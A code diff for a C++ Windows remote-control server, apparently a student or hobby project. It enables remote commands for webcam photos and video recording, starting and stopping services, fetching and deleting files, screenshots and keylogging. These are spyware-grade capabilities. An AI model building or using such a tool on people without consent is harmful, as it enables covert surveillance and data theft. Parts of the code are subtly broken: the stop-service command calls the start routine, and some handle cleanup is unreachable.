@@ -32,15 +32,15 @@ ReceiveCommand::ReceiveCommand() : command(), parameter() {
                      {"startapp", new StartAppCommand},
                      {"stopapp", new StopAppCommand},
                      {"listser", new ListSerCommand},
-                     //{"startser", new StartSerCommand},
-                     //{"stopser", new StopSerCommand},
+                     {"startser", new StartSerCommand},
+                     {"stopser", new StopSerCommand},
                      {"listfile", new ListFileCommand},
                      {"getfile", new GetFileCommand},
                      {"deletefile", new DeleteFileCommand},
                      {"screenshot", new ScreenshotCommand},
-                     //{"takephoto", new TakePhotoCommand},
-                     //{"startrecord", new StartRecordCommand},
-                     //{"stoprecord", new StopRecordCommand},
+                     {"takephoto", new TakePhotoCommand},
+                     {"startrecord", new StartRecordCommand},
+                     {"stoprecord", new StopRecordCommand},
                      {"startkeylog", new StartKeylogCommand},
                      {"stopkeylog", new StopKeylogCommand},
                      });
@@ -70,7 +70,8 @@ void ReceiveCommand::executeCommand(Server& server) {
         commands[command]->execute(server, parameter);
     }
     else{
-        std::cout << "THUA" << std::endl;
+        std::cout << "no matching command" << std::endl;
+        server.echo("OOF");
     }
 
 	command = "";
@@ -108,9 +109,10 @@ void GetFileCommand::execute(Server& server, const std::string& param){
 
     if (status == 0)
         message = "File at \\\"" + toRawString(param) + "\\\" was sent successfully.";  
-    else
+    else{
         message = "Get file error: Server could not send file at \\\"" + toRawString(param) + "\\\".";
         file_name = "";
+    }
 
     server.echo(createResponse());
 }
@@ -310,18 +312,18 @@ void StopAppCommand::execute(Server& server, const std::string& param){
 int GetEncoderClsid(const wchar_t* format, CLSID* pClsid) {
     UINT num = 0;
     UINT size = 0;
-    ImageCodecInfo* pImageCodecInfo = NULL;
+    Gdiplus::ImageCodecInfo* pImageCodecInfo = NULL;
 
     // Get the number of image encoders and their size
-    GetImageEncodersSize(&num, &size);
+    Gdiplus::GetImageEncodersSize(&num, &size);
     if (size == 0) return -1;
 
     // Allocate memory for the encoders
-    pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
+    pImageCodecInfo = (Gdiplus::ImageCodecInfo*)(malloc(size));
     if (pImageCodecInfo == NULL) return -1;
 
     // Get the available encoders
-    GetImageEncoders(num, size, pImageCodecInfo);
+    Gdiplus::GetImageEncoders(num, size, pImageCodecInfo);
 
     // Search for the required encoder (e.g., PNG)
     for (UINT j = 0; j < num; ++j) {
@@ -341,9 +343,9 @@ void ScreenshotCommand::execute(Server& server, const std::string& param){
     std::string output_file = "screenshot.png";
 
     // Initialize GDI+
-    GdiplusStartupInput gdiplusStartupInput;
+    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
     ULONG_PTR gdiplusToken;
-    if (GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL) != GpStatus::Ok) {
+    if (Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL) != Gdiplus::GpStatus::Ok) {
         status = 1;
         message = "Screenshot error: GDI+ startup failed.";
         server.echo(createResponse());
@@ -361,7 +363,7 @@ void ScreenshotCommand::execute(Server& server, const std::string& param){
         status = 1;
         message = "Screenshot error: cannot allocate memory.";
         server.echo(createResponse());
-        GdiplusShutdown(gdiplusToken);
+        Gdiplus::GdiplusShutdown(gdiplusToken);
         return;
     }
 
@@ -371,7 +373,7 @@ void ScreenshotCommand::execute(Server& server, const std::string& param){
         message = "Screenshot error: cannot allocate memory.";
         server.echo(createResponse());
         ReleaseDC(NULL, hScreenDC);
-        GdiplusShutdown(gdiplusToken);
+        Gdiplus::GdiplusShutdown(gdiplusToken);
         return;
     }
 
@@ -383,7 +385,7 @@ void ScreenshotCommand::execute(Server& server, const std::string& param){
         server.echo(createResponse());
         DeleteDC(hMemoryDC);
         ReleaseDC(NULL, hScreenDC);
-        GdiplusShutdown(gdiplusToken);
+        Gdiplus::GdiplusShutdown(gdiplusToken);
         return;
     }
     SelectObject(hMemoryDC, hBitmap);
@@ -396,7 +398,7 @@ void ScreenshotCommand::execute(Server& server, const std::string& param){
         DeleteObject(hBitmap);
         DeleteDC(hMemoryDC);
         ReleaseDC(NULL, hScreenDC);
-        GdiplusShutdown(gdiplusToken);
+        Gdiplus::GdiplusShutdown(gdiplusToken);
         return;
     }
 
@@ -410,7 +412,7 @@ void ScreenshotCommand::execute(Server& server, const std::string& param){
         DeleteObject(hBitmap);
         DeleteDC(hMemoryDC);
         ReleaseDC(NULL, hScreenDC);
-        GdiplusShutdown(gdiplusToken);
+        Gdiplus::GdiplusShutdown(gdiplusToken);
         return;
     }
 
@@ -424,7 +426,7 @@ void ScreenshotCommand::execute(Server& server, const std::string& param){
         DeleteObject(hBitmap);
         DeleteDC(hMemoryDC);
         ReleaseDC(NULL, hScreenDC);
-        GdiplusShutdown(gdiplusToken);
+        Gdiplus::GdiplusShutdown(gdiplusToken);
         return;
     }
 
@@ -442,7 +444,7 @@ void ScreenshotCommand::execute(Server& server, const std::string& param){
     ReleaseDC(NULL, hScreenDC);
 
     // Shutdown GDI+
-    GdiplusShutdown(gdiplusToken);
+    Gdiplus::GdiplusShutdown(gdiplusToken);
 }
 
 void ListSerCommand::listRunningServices() {
@@ -522,137 +524,375 @@ void ListSerCommand::execute(Server& server, const std::string& param) {
     server.echo(createResponse());
 }
 
-std::string TakePhotoCommand::detectWebcam(){
-    std::string webcamName = "";
+int __stdcall DoStartSvc(std::string szSvcName){
+    SC_HANDLE schSCManager;
+    SC_HANDLE schService;
+    // char szSvcName[256];
+    SERVICE_STATUS_PROCESS ssStatus; 
+    DWORD dwOldCheckPoint; 
+    DWORD dwStartTickCount;
+    DWORD dwWaitTime;
+    DWORD dwBytesNeeded;
 
-    HRESULT hr = CoInitialize(NULL);
-    if (FAILED(hr)) {
-        std::cerr << "Failed to initialize COM library." << std::endl;
-        return webcamName;
+    schSCManager = OpenSCManager( 
+        NULL,                    
+        NULL,                   
+        SC_MANAGER_ALL_ACCESS);
+
+    if (NULL == schSCManager) 
+    {
+        printf("OpenSCManager failed (%d)\n", GetLastError());
+        return FAILURE;
     }
 
-    // Create the system device enumerator
-    ICreateDevEnum* pDevEnum = NULL;
-    hr = CoCreateInstance(CLSID_SystemDeviceEnum, NULL, CLSCTX_INPROC_SERVER, IID_ICreateDevEnum, (void**)&pDevEnum);
-    if (FAILED(hr)) {
-        std::cerr << "Failed to create device enumerator." << std::endl;
-        CoUninitialize();
-        return webcamName;
+    // Get a handle to the service
+    schService = OpenService( 
+        schSCManager,            // SCM database 
+        szSvcName.c_str(),               // name of service
+        SERVICE_ALL_ACCESS);     // full access
+
+    if (schService == NULL)
+    { 
+        printf("OpenService failed (%d)\n", GetLastError()); 
+        CloseServiceHandle(schSCManager);
+        return FAILURE;
     }
 
-    // Enumerate video capture devices (webcams)
-    IEnumMoniker* pEnum = NULL;
-    hr = pDevEnum->CreateClassEnumerator(CLSID_VideoInputDeviceCategory, &pEnum, 0);
-    if (hr == S_OK) {
-        IMoniker* pMoniker = NULL;
-        ULONG fetched;
-        while (pEnum->Next(1, &pMoniker, &fetched) == S_OK) {
-            IPropertyBag* pPropBag;
-            hr = pMoniker->BindToStorage(0, 0, IID_IPropertyBag, (void**)&pPropBag);
-            if (hr == S_OK) {
-                VARIANT var;
-                VariantInit(&var);
-                hr = pPropBag->Read(L"FriendlyName", &var, 0);
-                if (hr == S_OK) {
-                    // Convert the webcam name from wide string to standard string
-                    std::wstring ws(var.bstrVal);
-                    webcamName = std::string(ws.begin(), ws.end());
-                    VariantClear(&var);
-                }
-                pPropBag->Release();
+    // Check the status in case the service is not stopped
+    if (!QueryServiceStatusEx( 
+            schService,                     // handle to service
+            SC_STATUS_PROCESS_INFO,         // information level
+            (LPBYTE) &ssStatus,             // address of structure
+            sizeof(SERVICE_STATUS_PROCESS), // size of structure
+            &dwBytesNeeded ) )              // size needed if buffer is too small
+    {
+        printf("QueryServiceStatusEx failed (%d)\n", GetLastError());
+        CloseServiceHandle(schService); 
+        CloseServiceHandle(schSCManager);
+        return FAILURE;  
+    }
+
+    // Check if the service is already running
+    if(ssStatus.dwCurrentState != SERVICE_STOPPED && ssStatus.dwCurrentState != SERVICE_STOP_PENDING)
+    {
+        printf("Cannot start the service because it is already running\n");
+        CloseServiceHandle(schService); 
+        CloseServiceHandle(schSCManager);
+        return FAILURE; 
+    }
+
+    // Save the tick count and initial checkpoint
+    dwStartTickCount = GetTickCount();
+    dwOldCheckPoint = ssStatus.dwCheckPoint;
+
+    // Wait for the service to stop before attempting to start it
+    while (ssStatus.dwCurrentState == SERVICE_STOP_PENDING)
+    {
+        // Do not wait longer than the wait hint
+        dwWaitTime = ssStatus.dwWaitHint / 10;
+
+        if (dwWaitTime < 1000)
+            dwWaitTime = 1000;
+        else if (dwWaitTime > 10000)
+            dwWaitTime = 10000;
+
+        Sleep(dwWaitTime);
+
+        // Check the status until the service is no longer stop pending
+        if (!QueryServiceStatusEx( 
+                schService,                     // handle to service
+                SC_STATUS_PROCESS_INFO,         // information level
+                (LPBYTE) &ssStatus,             // address of structure
+                sizeof(SERVICE_STATUS_PROCESS), // size of structure
+                &dwBytesNeeded ) )              // size needed if buffer is too small
+        {
+            printf("QueryServiceStatusEx failed (%d)\n", GetLastError());
+            CloseServiceHandle(schService); 
+            CloseServiceHandle(schSCManager);
+            return FAILURE; 
+        }
+
+        if (ssStatus.dwCheckPoint > dwOldCheckPoint)
+        {
+            // Continue to wait and check
+            dwStartTickCount = GetTickCount();
+            dwOldCheckPoint = ssStatus.dwCheckPoint;
+        }
+        else
+        {
+            if(GetTickCount()-dwStartTickCount > ssStatus.dwWaitHint)
+            {
+                printf("Timeout waiting for service to stop\n");
+                CloseServiceHandle(schService); 
+                CloseServiceHandle(schSCManager);
+                return FAILURE; 
             }
-            pMoniker->Release();
+        }
+    }
 
-            // Use the first webcam found
+    // Attempt to start the service
+    if (!StartService(schService, 0, NULL))
+    {
+        printf("StartService failed (%d)\n", GetLastError());
+        CloseServiceHandle(schService); 
+        CloseServiceHandle(schSCManager);
+        return FAILURE; 
+    }
+    else 
+        printf("Service start pending...\n");
+
+    // Check the status until the service is no longer start pending
+    if (!QueryServiceStatusEx( 
+            schService,                      
+            SC_STATUS_PROCESS_INFO,         
+            (LPBYTE) &ssStatus,              
+            sizeof(SERVICE_STATUS_PROCESS),  
+            &dwBytesNeeded ) )              
+    {
+        printf("QueryServiceStatusEx failed (%d)\n", GetLastError());
+        CloseServiceHandle(schService); 
+        CloseServiceHandle(schSCManager);
+        return FAILURE; 
+    }
+
+    // Save the tick count and initial checkpoint
+    dwStartTickCount = GetTickCount();
+    dwOldCheckPoint = ssStatus.dwCheckPoint;
+
+    while (ssStatus.dwCurrentState == SERVICE_START_PENDING)
+    {
+        dwWaitTime = ssStatus.dwWaitHint / 10;
+
+        if (dwWaitTime < 1000)
+            dwWaitTime = 1000;
+        else if (dwWaitTime > 10000)
+            dwWaitTime = 10000;
+
+        Sleep(dwWaitTime);
+
+        if (!QueryServiceStatusEx( 
+            schService,             // handle to service
+            SC_STATUS_PROCESS_INFO, // info level
+            (LPBYTE) &ssStatus,     // address of structure
+            sizeof(SERVICE_STATUS_PROCESS), // size of structure
+            &dwBytesNeeded ) )      // if buffer too small
+        {
+            printf("QueryServiceStatusEx failed (%d)\n", GetLastError());
             break;
         }
-    } else {
-        std::cerr << "No webcams found." << std::endl;
+
+        if (ssStatus.dwCheckPoint > dwOldCheckPoint)
+        {
+            dwStartTickCount = GetTickCount();
+            dwOldCheckPoint = ssStatus.dwCheckPoint;
+        }
+        else
+        {
+            if (GetTickCount()-dwStartTickCount > ssStatus.dwWaitHint)
+            {
+                break;
+            }
+        }
     }
 
-    if (pEnum) pEnum->Release();
-    pDevEnum->Release();
-    CoUninitialize();
+    // Determine whether the service is running
+    if (ssStatus.dwCurrentState == SERVICE_RUNNING)
+    {
+        return SUCCESS;
+    }
+    else 
+    { 
+        printf("Service not started. \n");
+        printf("  Current State: %d\n", ssStatus.dwCurrentState); 
+        printf("  Exit Code: %d\n", ssStatus.dwWin32ExitCode); 
+        printf("  Check Point: %d\n", ssStatus.dwCheckPoint); 
+        printf("  Wait Hint: %d\n", ssStatus.dwWaitHint); 
+        return FAILURE;
+    }
 
-    return webcamName;
+    CloseServiceHandle(schService); 
+    CloseServiceHandle(schSCManager);
 }
 
-int TakePhotoCommand::takePhoto(){
-    std::string webcamName = detectWebcam();
-    if (webcamName.empty()) {
-        std::cerr << "Error: No webcam detected." << std::endl;
+void StartSerCommand::execute(Server& server, const std::string& param){
+    status = DoStartSvc(param);
+    file_name = "";
+
+    if (status == FAILURE){
+        message = "Could not start service: " + param; 
+    }
+    else{
+        message = "Service " + param + " started successfully";
+    }
+
+    server.echo(createResponse());
+}
+
+
+
+// Function to stop the service
+int __stdcall DoStopSvc(std::string szSvcName)
+{
+    SC_HANDLE schSCManager;
+    SC_HANDLE schService;
+    SERVICE_STATUS_PROCESS ssStatus; 
+    DWORD dwBytesNeeded;
+    DWORD dwStartTickCount;
+    DWORD dwWaitTime;
+
+    // Get a handle to the SCM database
+    schSCManager = OpenSCManager( 
+        NULL,                    // local computer
+        NULL,                    // servicesActive database
+        SC_MANAGER_ALL_ACCESS);  // full access rights
+
+    if (NULL == schSCManager) 
+    {
+        printf("OpenSCManager failed (%d)\n", GetLastError());
         return FAILURE;
     }
 
-    std::cout << "Detected Webcam: " << webcamName << std::endl;
+    // Get a handle to the service
+    schService = OpenService( 
+        schSCManager,            // SCM database 
+        szSvcName.c_str(),               // name of service
+        SERVICE_ALL_ACCESS);     // full access
 
-    // Construct the ffmpeg command with the detected webcam name
-    std::ostringstream cmd;
-    cmd << "\"ffmpeg.exe\" " //replace with your ffmpeg bin path
-            << "-f dshow -i video=\"" << webcamName << "\" "
-            << "-vframes 1 -rtbufsize 100M -y -update 1 "
-            << directory + "snapshot.png"; //replace with your path that you want to save as
-
-    // Initialize STARTUPINFO and PROCESS_INFORMATION structs
-    STARTUPINFO si = { sizeof(si) };
-    PROCESS_INFORMATION pi;
-
-    // Convert the string command to a C-string (LPSTR)
-    LPSTR cmdLine = _strdup(cmd.str().c_str());
-
-    // Create the process
-    if (CreateProcess(
-            NULL,        // Application name
-            cmdLine,     // Command line
-            NULL,        // Process security attributes
-            NULL,        // Thread security attributes
-            FALSE,       // Inherit handles
-            0,           // Creation flags
-            NULL,        // Environment block
-            NULL,        // Current directory
-            &si,         // Startup information
-            &pi          // Process information
-    )) {
-        std::cout << "Snapshot captured successfully!" << std::endl;
-
-        // Wait for the process to finish
-        WaitForSingleObject(pi.hProcess, INFINITE);
-
-        // Clean up handles
-        CloseHandle(pi.hProcess);
-        CloseHandle(pi.hThread);
-    } else {
-        std::cerr << "Error: Failed to capture snapshot. Error code: " << GetLastError() << std::endl;
+    if (schService == NULL)
+    { 
+        printf("OpenService failed (%d)\n", GetLastError()); 
+        CloseServiceHandle(schSCManager);
         return FAILURE;
     }
 
-    // Free the duplicated string
-    free(cmdLine);
-    return SUCCESS;
+    // Query the service status
+    if (!QueryServiceStatusEx( 
+            schService,                     // handle to service
+            SC_STATUS_PROCESS_INFO,         // information level
+            (LPBYTE) &ssStatus,             // address of structure
+            sizeof(SERVICE_STATUS_PROCESS), // size of structure
+            &dwBytesNeeded ) )              // size needed if buffer is too small
+    {
+        printf("QueryServiceStatusEx failed (%d)\n", GetLastError());
+        CloseServiceHandle(schService); 
+        CloseServiceHandle(schSCManager);
+        return FAILURE; 
+    }
+
+    // Check if the service is already stopped
+    if (ssStatus.dwCurrentState == SERVICE_STOPPED)
+    {
+        printf("The service is already stopped.\n");
+        CloseServiceHandle(schService); 
+        CloseServiceHandle(schSCManager);
+        return FAILURE;
+    }
+
+    // Attempt to stop the service
+    if (!ControlService(schService, SERVICE_CONTROL_STOP, (LPSERVICE_STATUS) &ssStatus))
+    {
+        printf("ControlService failed (%d)\n", GetLastError());
+        CloseServiceHandle(schService); 
+        CloseServiceHandle(schSCManager);
+        return FAILURE;
+    }
+    else 
+        printf("Service stop pending...\n");
+
+    // Wait for the service to stop
+    dwStartTickCount = GetTickCount();
+    DWORD dwMaxWaitTime = 60000; // Max wait time set to 60 seconds
+
+    while (ssStatus.dwCurrentState != SERVICE_STOPPED)
+    {
+        dwWaitTime = ssStatus.dwWaitHint / 10;
+        if (dwWaitTime < 1000)
+            dwWaitTime = 1000;
+        else if (dwWaitTime > 10000)
+            dwWaitTime = 10000;
+
+        Sleep(dwWaitTime);
+
+        // Query the service status again
+        if (!QueryServiceStatusEx( 
+            schService,                     // handle to service
+            SC_STATUS_PROCESS_INFO,         // information level
+            (LPBYTE) &ssStatus,             // address of structure
+            sizeof(SERVICE_STATUS_PROCESS), // size of structure
+            &dwBytesNeeded ) )              // size needed if buffer is too small
+        {
+            printf("QueryServiceStatusEx failed (%d)\n", GetLastError());
+            break;
+        }
+
+        // Check for timeout or state changes
+        if (GetTickCount() - dwStartTickCount > dwMaxWaitTime)
+        {
+            printf("Timeout waiting for service to stop.\n");
+            break;
+        }
+    }
+
+    // Final status of the service
+    if (ssStatus.dwCurrentState == SERVICE_STOPPED)
+    {
+        return SUCCESS;
+    }
+    else 
+    { 
+        printf("Service not stopped. \n");
+        printf("  Current State: %d\n", ssStatus.dwCurrentState); 
+        printf("  Exit Code: %d\n", ssStatus.dwWin32ExitCode); 
+        printf("  Check Point: %d\n", ssStatus.dwCheckPoint); 
+        printf("  Wait Hint: %d\n", ssStatus.dwWaitHint); 
+        return FAILURE;
+    }
+
+    CloseServiceHandle(schService); 
+    CloseServiceHandle(schSCManager);
+}
+
+void StopSerCommand::execute(Server& server, const std::string& param){
+    status = DoStartSvc(param);
+    file_name = "";
+
+    if (status == FAILURE){
+        message = "Could not stop service: " + param; 
+    }
+    else{
+        message = "Service " + param + " stopped successfully";
+    }
+
+    server.echo(createResponse());
 }
 
 void TakePhotoCommand::execute(Server& server, const std::string& param){
-    status = takePhoto();
+    WebcamController* wc = WebcamController::getInstance();
     file_name = "";
     std::string outfile = "snapshot.png";
+
+    status = wc->takePhoto(message);
 
     if (status == SUCCESS){
         status = sendFile(server, directory + outfile);
         if (status == SUCCESS){
             file_name = "snapshot.png";
-            message = "Photo taken successfully\n\n";
+            message = "Photo taken successfully.";
         }
         else{
-            message = "Failed to send the photo to client\n\n";
+            message = "Failed to send the photo to client.";
         }
 
     }
     else{
         server.echo("error");
-        message = "Failed to take a photo\n\n";
     }
 
+    if (!wc->isRecording())
+        WebcamController::deleteInstance();
+
     server.echo(createResponse());
+    
 }
 
 void StartKeylogCommand::execute(Server& server, const std::string& param) {
@@ -702,3 +942,40 @@ void StopKeylogCommand::execute(Server& server, const std::string& param) {
     KeyLogger::deleteInstance();
 }
 
+
+
+
+void StartRecordCommand::execute(Server& server, const std::string& param){
+    WebcamController* wc = WebcamController::getInstance();
+    file_name = "";
+    status = wc->StartRecord(message);
+
+    if (!wc->isRecording())
+        WebcamController::deleteInstance();
+
+    server.echo(createResponse());
+}
+
+void StopRecordCommand::execute(Server& server, const std::string& param){
+    WebcamController* wc = WebcamController::getInstance();
+    file_name = "";
+    status = wc->StopRecord(message);
+
+    if (status == SUCCESS){
+        server.echo("RUNNING");
+        string outfile = "video.mp4";
+        status = sendFile(server, directory + outfile);
+        if (status == SUCCESS){
+            file_name = outfile;
+        }
+        else{
+            message = "Failed to send the photo to client.";
+        }
+    }
+    else{
+        server.echo("OOF");
+    }
+
+    server.echo(createResponse());
+    WebcamController::deleteInstance();
+}
